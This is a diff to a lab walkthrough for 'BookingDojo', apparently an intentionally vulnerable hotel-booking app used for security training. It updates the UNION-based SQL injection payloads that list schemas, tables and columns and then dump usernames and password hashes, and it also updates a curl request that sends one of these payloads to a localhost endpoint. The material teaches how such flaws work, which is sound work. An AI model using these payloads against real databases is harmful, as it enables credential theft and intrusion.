@@ -31,7 +31,6 @@ Start the stack:
 
 ```bash
 docker compose up -d
-dotnet run --project src/BookingDojo.Api -- --seed-and-exit
 dotnet run --project src/BookingDojo.Api &
 dotnet run --project src/BookingDojo.Bff &
 cd src/bookingdojo-ui && npm run dev &
@@ -49,10 +48,10 @@ Restart the API if you change the flag.
 
 The database is pre-seeded with bookings owned by different users:
 
-| Booking ID | Owner   | Hotel              | Card last 4 |
-|-----------|---------|--------------------|-------------|
-| 1         | admin   | Grand City Hotel   | 1234        |
-| 2         | partner | Sunset Beach Hotel | 4242        |
+| Booking ID | Owner   | Hotel                  | Card last 4 |
+|-----------|---------|------------------------|-------------|
+| 1         | admin   | Alpine Lodge           | 1234        |
+| 2         | partner | Beach Paradise Resort  | 4242        |
 
 ---
 
@@ -62,8 +61,8 @@ Log in as `partner / Partner1234!` at `http://localhost:5173`.
 
 Navigate to **Bookings**. Below the New Booking form there is a **Search Bookings by Hotel** bar.
 
-1. Search for `Sunset` — you see Booking #2 (your own booking).
-2. Search for `Grand` — no results. Booking #1 belongs to `admin`, not you.
+1. Search for `Beach` — you see Booking #2 (your own booking at Beach Paradise Resort).
+2. Search for `Alpine` — no results. Booking #1 belongs to `admin`, not you.
 
 The search correctly scopes results to your account — at least for normal input.
 
@@ -154,7 +153,7 @@ A `UNION SELECT` appends extra rows to the original result set. The injected SEL
 - The **same number of columns** as the original query
 - **Compatible types** in each position
 
-The original query selects 10 columns in this order:
+The original query selects 11 columns in this order:
 
 | # | Column | Type |
 |---|--------|------|
@@ -166,15 +165,16 @@ The original query selects 10 columns in this order:
 | 6 | CheckIn | timestamp |
 | 7 | CheckOut | timestamp |
 | 8 | SpecialRequests | text |
-| 9 | CreatedAt | timestamp |
-| 10 | HotelName | text |
+| 9 | TotalPrice | decimal |
+| 10 | CreatedAt | timestamp |
+| 11 | HotelName | text |
 
 ### Step 4a — Discover schemas
 
 Paste this into the search box:
 
 ```
-%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',schema_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',NOW(),'SCHEMAS' FROM information_schema.schemata --
+%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',schema_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',0.00,NOW(),'SCHEMAS' FROM information_schema.schemata --
 ```
 
 Rows with **Hotel = "SCHEMAS"** appear in the results. The **User** column reveals the schema names: `bookingdojo`, `public`, `pg_catalog`, etc.
@@ -182,7 +182,7 @@ Rows with **Hotel = "SCHEMAS"** appear in the results. The **User** column revea
 ### Step 4b — Discover tables
 
 ```
-%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',table_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',NOW(),'TABLES' FROM information_schema.tables WHERE table_schema='bookingdojo' --
+%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',table_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',0.00,NOW(),'TABLES' FROM information_schema.tables WHERE table_schema='bookingdojo' --
 ```
 
 Rows with **Hotel = "TABLES"** list every table: `Users`, `Bookings`, `Hotels`, `Coupons`, `PasswordResetTokens`.
@@ -190,7 +190,7 @@ Rows with **Hotel = "TABLES"** list every table: `Users`, `Bookings`, `Hotels`, 
 ### Step 4c — Discover columns in Users
 
 ```
-%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',column_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',NOW(),'COLUMNS' FROM information_schema.columns WHERE table_schema='bookingdojo' AND table_name='Users' --
+%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',column_name,'00000000-0000-0000-0000-000000000000','x',NOW(),NOW(),'x',0.00,NOW(),'COLUMNS' FROM information_schema.columns WHERE table_schema='bookingdojo' AND table_name='Users' --
 ```
 
 Rows with **Hotel = "COLUMNS"** reveal: `Id`, `Username`, `PasswordHash`, `Role`, `PartnerId`.
@@ -200,7 +200,7 @@ Rows with **Hotel = "COLUMNS"** reveal: `Id`, `Username`, `PasswordHash`, `Role`
 Now the attacker knows the exact table and column names. This final payload dumps all credentials:
 
 ```
-%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',"Username",'00000000-0000-0000-0000-000000000000',"PasswordHash",NOW(),NOW(),'INJECTED',NOW(),'PWNED' FROM bookingdojo."Users" --
+%' OR '1'='1' UNION SELECT 1,'00000000-0000-0000-0000-000000000000',"Username",'00000000-0000-0000-0000-000000000000',"PasswordHash",NOW(),NOW(),'INJECTED',0.00,NOW(),'PWNED' FROM bookingdojo."Users" --
 ```
 
 In the search results, rows where **Hotel = "PWNED"** contain:
@@ -211,7 +211,7 @@ In the search results, rows where **Hotel = "PWNED"** contain:
 >
 > ```bash
 > curl -s -b cookies.txt \
->   "http://localhost:5001/bff/bookings/search?q=%25'+OR+'1'%3D'1'+UNION+SELECT+1%2C'00000000-0000-0000-0000-000000000000'%2C%22Username%22%2C'00000000-0000-0000-0000-000000000000'%2C%22PasswordHash%22%2CNOW()%2CNOW()%2C'INJECTED'%2CNOW()%2C'PWNED'+FROM+bookingdojo.%22Users%22+--" \
+>   "http://localhost:5001/bff/bookings/search?q=%25'+OR+'1'%3D'1'+UNION+SELECT+1%2C'00000000-0000-0000-0000-000000000000'%2C%22Username%22%2C'00000000-0000-0000-0000-000000000000'%2C%22PasswordHash%22%2CNOW()%2CNOW()%2C'INJECTED'%2C0.00%2CNOW()%2C'PWNED'+FROM+bookingdojo.%22Users%22+--" \
 >   | jq '.results[] | select(.hotelName == "PWNED") | {username, cardLastFour}'
 > ```
 >
